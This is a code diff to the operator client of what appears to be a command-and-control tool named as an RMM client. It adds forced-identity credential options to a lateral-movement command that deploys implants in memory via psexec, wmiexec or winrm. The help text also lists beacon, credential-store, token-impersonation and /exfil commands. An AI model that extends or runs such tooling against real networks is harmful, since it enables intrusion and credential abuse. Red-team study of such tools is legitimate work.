@@ -241,6 +241,10 @@ class RmmApiClient:
         insecure: bool = False,
         loader: str = "csharp",
         independent: bool = True,
+        identity_cred_id: str = "",
+        identity_domain: str = "",
+        identity_user: str = "",
+        identity_password: str = "",
     ):
         if not isinstance(https, bool) or (https and method.strip().lower() != "winrm"):
             raise ValueError("https must be a boolean and is supported only for winrm")
@@ -254,21 +258,35 @@ class RmmApiClient:
             # Independent lifetime is a winrm-scoped option and is ignored
             # for the other methods, matching the server-side normalization.
             independent = False
+        identity_domain = str(identity_domain or "").strip()
+        identity_user = str(identity_user or "").strip()
+        identity_password = str(identity_password or "")
+        if identity_cred_id and (identity_domain or identity_user or identity_password):
+            raise ValueError("Use either identity_cred_id or identity credentials, not both")
+        if not identity_cred_id and not identity_user and (identity_domain or identity_password):
+            raise ValueError("identity credentials require a user")
+        body = {
+            "method": method,
+            "host": host,
+            "verify": verify,
+            "exec_timeout": exec_timeout,
+            "register_timeout": register_timeout,
+            "verify_timeout": verify_timeout,
+            "loader": (loader or "csharp").strip().lower(),
+            **({"independent": independent} if method.strip().lower() == "winrm" else {}),
+            **({"https": True} if https else {}),
+            **({"insecure": True} if insecure else {}),
+            **({"identity_cred_id": identity_cred_id} if identity_cred_id else {}),
+            **({
+                "identity_domain": identity_domain,
+                "identity_user": identity_user,
+                "identity_password": identity_password,
+            } if (identity_user and not identity_cred_id) else {}),
+        }
         return self.request(
             "POST",
             f"/api/v1/sessions/{session_id}/lateral",
-            {
-                "method": method,
-                "host": host,
-                "verify": verify,
-                "exec_timeout": exec_timeout,
-                "register_timeout": register_timeout,
-                "verify_timeout": verify_timeout,
-                "loader": (loader or "csharp").strip().lower(),
-                **({"independent": independent} if method.strip().lower() == "winrm" else {}),
-                **({"https": True} if https else {}),
-                **({"insecure": True} if insecure else {}),
-            },
+            body,
             # Worst case: lateral execution wait + registration + two verifications.
             timeout=exec_timeout + register_timeout + 2 * verify_timeout + 30,
         )
@@ -1246,6 +1264,16 @@ def cmd_lateral(client: RmmApiClient, state: dict, args):
         die("--insecure requires --https", 1)
     if getattr(args, "tethered", False) and args.method != "winrm":
         die("--tethered is supported only for winrm", 1)
+    identity_cred_id = (getattr(args, "identity_cred_id", None) or "").strip()
+    identity_user = (getattr(args, "identity_user", None) or "").strip()
+    identity_password = getattr(args, "identity_password", None) or ""
+    if identity_cred_id and (identity_user or identity_password):
+        die("Use either -i <cred_id> or --user/--password, not both", 1)
+    if identity_cred_id or identity_user:
+        if args.method not in ("wmiexec", "winrm"):
+            die("A forced identity is supported only for wmiexec and winrm", 1)
+        if not identity_cred_id and not identity_user:
+            die("A forced identity requires -i <cred_id> or --user with --password", 1)
     say(f"Lateral {args.method} to {args.host} (waits for the next beacon)...", err=True)
     # WinRM deployments are independent by default; --tethered restores the
     # held-shell lifetime. Independent is winrm-scoped and omitted elsewhere.
@@ -1262,6 +1290,9 @@ def cmd_lateral(client: RmmApiClient, state: dict, args):
         **({"independent": independent} if args.method == "winrm" else {}),
         **({"https": True} if getattr(args, "https", False) else {}),
         **({"insecure": True} if getattr(args, "insecure", False) else {}),
+        **({"identity_cred_id": identity_cred_id} if identity_cred_id else {}),
+        **({"identity_user": identity_user, "identity_password": identity_password}
+           if (identity_user and not identity_cred_id) else {}),
     )
     if args.json:
         print_json(data)
@@ -1719,7 +1750,7 @@ Spawn:    /spawn [id]   (same identity; children inherit the source build mode)
           /runas -i <cred_id> <command>   (run command under different identity)
 Creds:    /creds list | /creds add <domain\\user | user> <password> | /creds del -i <cred_id> | /creds purge
 Identity: /make_token -i <cred_id> | /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
-Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure] [-l|--loader csharp|powershell] [--tethered]   (HTTPS/5986 for winrm only; wmiexec/winrm deploy in memory via the csharp loader; winrm is independent by default — --tethered keeps the deployment alive only as long as the source holds its shell; powershell is reserved)
+Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure] [-l|--loader csharp|powershell] [--tethered] [-i <cred_id> | -u <identity> [-p <password>]]   (HTTPS/5986 for winrm only; wmiexec/winrm deploy in memory via the csharp loader; winrm is independent by default — --tethered keeps the deployment alive only as long as the source holds its shell; powershell is reserved; -i/-u forces the deployment identity for wmiexec/winrm — explicit credentials beat an active make_token and work from in-memory sources)
           -k requires -s and skips CA/name/revocation checks; certificate dates still apply.
 Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
 Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
@@ -2293,6 +2324,9 @@ def run_interactive(
             if cmd == "lateral":
                 method = rest[0].lower() if rest else ""
                 loader_values = []
+                identity_cred_values = []
+                identity_user_values = []
+                identity_password_values = []
                 rest_args = []
                 index = 1
                 while index < len(rest):
@@ -2303,11 +2337,43 @@ def run_interactive(
                         loader_values.append(rest[index + 1])
                         index += 2
                         continue
+                    if rest[index] in ("-i", "--cred"):
+                        if index + 1 >= len(rest):
+                            identity_cred_values = ["<missing>"]
+                            break
+                        identity_cred_values.append(rest[index + 1])
+                        index += 2
+                        continue
+                    if rest[index] in ("-u", "--user"):
+                        if index + 1 >= len(rest):
+                            identity_user_values = ["<missing>"]
+                            break
+                        identity_user_values.append(rest[index + 1])
+                        index += 2
+                        continue
+                    if rest[index] in ("-p", "--password"):
+                        if index + 1 >= len(rest):
+                            identity_password_values = ["<missing>"]
+                            break
+                        identity_password_values.append(rest[index + 1])
+                        index += 2
+                        continue
                     rest_args.append(rest[index])
                     index += 1
                 flags = [arg for arg in rest_args if arg in ("-s", "--https")]
                 insecure_flags = [arg for arg in rest_args if arg in ("-k", "--insecure")]
                 tethered_flags = [arg for arg in rest_args if arg == "--tethered"]
+                identity_values = identity_cred_values + identity_user_values + identity_password_values
+                identity_flags = bool(identity_values)
+                # Either one credential ID, or a direct identity (password
+                # optional, matching make_token); never both, never leftovers.
+                identity_valid = (not identity_flags or
+                                  ("<missing>" not in identity_values and
+                                   len(identity_cred_values) <= 1 and
+                                   len(identity_user_values) <= 1 and
+                                   len(identity_password_values) <= 1 and
+                                   ((identity_cred_values and not identity_user_values and not identity_password_values) or
+                                    (identity_user_values and not identity_cred_values))))
                 plain_args = [arg for arg in rest_args if arg not in ("-s", "--https", "-k", "--insecure", "--tethered", "--independent")]
                 targets = plain_args
                 if (method not in ("psexec", "wmiexec", "winrm") or
@@ -2317,8 +2383,10 @@ def run_interactive(
                         (flags and method != "winrm") or
                         (tethered_flags and method != "winrm") or
                         len(loader_values) > 1 or
-                        any(value not in ("csharp", "powershell") for value in loader_values)):
-                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)] [-l|--loader csharp|powershell] [--tethered (winrm only; independent is the default)]")
+                        any(value not in ("csharp", "powershell") for value in loader_values) or
+                        (identity_flags and method not in ("wmiexec", "winrm")) or
+                        not identity_valid):
+                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)] [-l|--loader csharp|powershell] [--tethered (winrm only; independent is the default)] [-i <cred_id> | -u <identity> [-p <password>] (wmiexec/winrm only; forces the deployment identity)]")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -2334,7 +2402,11 @@ def run_interactive(
                     **({"loader": loader_values[0]} if loader_values else {}),
                     **({"independent": independent} if method == "winrm" else {}),
                     **({"https": True} if flags else {}),
-                    **({"insecure": True} if insecure_flags else {}))
+                    **({"insecure": True} if insecure_flags else {}),
+                    **({"identity_cred_id": identity_cred_values[0]} if identity_cred_values else {}),
+                    **({"identity_user": identity_user_values[0],
+                        "identity_password": (identity_password_values[0] if identity_password_values else "")}
+                       if (identity_user_values and not identity_cred_values) else {}))
                 if code != 200:
                     detail = data.get("error") if isinstance(data, dict) else data
                     warn(f"lateral failed ({code})" + (f": {detail}" if detail else ""))
@@ -3000,6 +3072,12 @@ def build_parser() -> argparse.ArgumentParser:
                         help="No-op compatibility flag: winrm loader deployments are independent by default")
     sp_lat.add_argument("--tethered", action="store_true",
                         help="WinRM only: keep the classic tethered lifetime, where the source holds the shell open and the deployment dies with it")
+    sp_lat.add_argument("-i", dest="identity_cred_id", default=None,
+                        help="Credential ID from 'creds add' forcing the deployment identity (wmiexec/winrm only)")
+    sp_lat.add_argument("--user", dest="identity_user", default=None,
+                        help="Identity as DOMAIN\\user or plain user forcing the deployment identity (if no credential ID)")
+    sp_lat.add_argument("--password", dest="identity_password", default=None,
+                        help="Password for a direct identity (if no credential ID)")
     sp_lat.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
     sp_lat.add_argument("--exec-timeout", type=float, default=300, help="Seconds to wait for the lateral execution result")
     sp_lat.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the target session to register")
